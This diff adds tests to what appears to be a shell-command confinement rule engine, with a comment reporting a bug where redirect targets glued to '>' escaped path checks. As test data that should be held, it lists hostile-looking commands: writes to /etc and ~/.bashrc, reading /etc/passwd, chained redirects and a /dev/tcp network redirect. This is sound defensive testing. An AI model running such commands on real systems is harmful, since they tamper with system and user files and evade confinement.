@@ -294,3 +294,52 @@ describe('the session scratchpad is inside confinement', () => {
     expect(DEFAULT_ALLOW_PREFIXES).toContain('cd');
   });
 });
+
+/**
+ * CLAIM-RULES-SEE-REDIRECTS. A redirect's target is a path like any other.
+ *
+ * Measured on 2026-11-03 against 1.20.0's default rules: a path was found only
+ * when a word *began* with `/` or `~`, so a target glued to its operator was
+ * invisible. `echo hi >/etc/x` and `echo hi >>~/.bashrc` were auto-allowed by
+ * the `echo` rule, a write outside the project decided by a rule for printing,
+ * while `cat x > /dev/null` (spaced, so the path was seen) was held.
+ */
+describe('CLAIM-RULES-SEE-REDIRECTS: a redirect target is judged as a path', () => {
+  const defaults = defaultRuleInputs().map((r) => rule(r));
+  const decide = (c: string) => evaluateRules(defaults, cmd(c))?.decision ?? 'held';
+
+  it.each([
+    'echo hi >/etc/x',
+    'echo hi >>~/.bashrc',
+    'echo hi 2>/etc/x',
+    'echo hi &>/etc/x',
+    'echo hi >|/etc/x',
+    'echo x>/etc/y',
+    'echo x >"/etc/y"',
+    "echo x >'/etc/y'",
+    'cat </etc/passwd',
+    'S=x>/etc/y; ls',
+    'ls && echo x >/etc/y',
+  ])('does not auto-allow %j, which reaches outside the project', (c) => {
+    expect(decide(c)).toBe('held');
+  });
+
+  it.each([
+    'cat x > /dev/null',
+    'cat x >/dev/null',
+    'cat x >/dev/null 2>&1',
+    'cat x 2>/dev/null',
+    'ls &>/dev/null',
+    'echo hi >&2',
+    'echo hi >/dev/stderr',
+    'echo hi > out.txt',
+    `echo hi >${ROOT}/out.txt`,
+    'node t.js 2>&1 | tail -5',
+  ])('still allows %j, which stays inside the project or discards output', (c) => {
+    expect(decide(c)).toBe('allow');
+  });
+
+  it('a device other than the standard streams is still a path outside the project', () => {
+    expect(decide('cat x >/dev/tcp/1.2.3.4/80')).toBe('held');
+  });
+});
